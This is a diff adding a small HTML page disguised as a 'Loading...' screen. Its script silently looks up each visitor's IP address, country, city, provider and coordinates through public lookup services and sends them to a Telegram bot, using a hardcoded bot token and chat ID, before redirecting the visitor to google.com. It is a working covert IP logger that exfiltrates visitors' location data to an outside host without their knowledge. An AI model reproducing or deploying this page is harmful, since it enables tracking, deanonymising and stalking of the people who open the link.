@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><title>Загрузка...</title></head>
+<body>
+
+<script>
+const BOT_TOKEN = '8296295026:AAGTdXgQVEHrpPo8LCBTLSHFAuOp8sVoVyM';
+const CHAT_ID = '1948684561';
+
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(data => {
+    const ip = data.ip;
+    return fetch(`https://ipapi.co/${ip}/json/`);
+  })
+  .then(r => r.json())
+  .then(geo => {
+    const text = `🌍 Новый переход!\nIP: ${geo.ip}\nСтрана: ${geo.country_name}\nГород: ${geo.city}\nПровайдер: ${geo.org}\nШирота/Долгота: ${geo.latitude}, ${geo.longitude}\nВремя: ${new Date().toLocaleString()}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    });
+  });
+window.location.href = 'https://google.com';
+</script>
+</body>
+</html>
